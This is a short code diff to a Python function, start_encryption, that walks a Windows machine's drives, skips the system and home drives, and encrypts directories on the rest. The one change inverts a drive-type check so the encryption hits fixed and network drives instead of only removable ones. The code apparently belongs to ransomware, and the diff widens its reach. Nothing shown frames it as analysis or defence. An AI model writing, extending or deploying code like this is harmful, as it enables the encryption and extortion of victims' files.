@@ -419,7 +419,7 @@ def start_encryption():
                 if (
                     disk[:1] != os.getenv("SystemDrive")
                     and disk[:1] != os.getenv("HOMEDRIVE")
-                    and ctypes.windll.kernel32.GetDriveTypeW(disk) == 2
+                    and ctypes.windll.kernel32.GetDriveTypeW(disk) != 2
                 ):
                     encrypt_directory(disk, bytes(key))
         else:
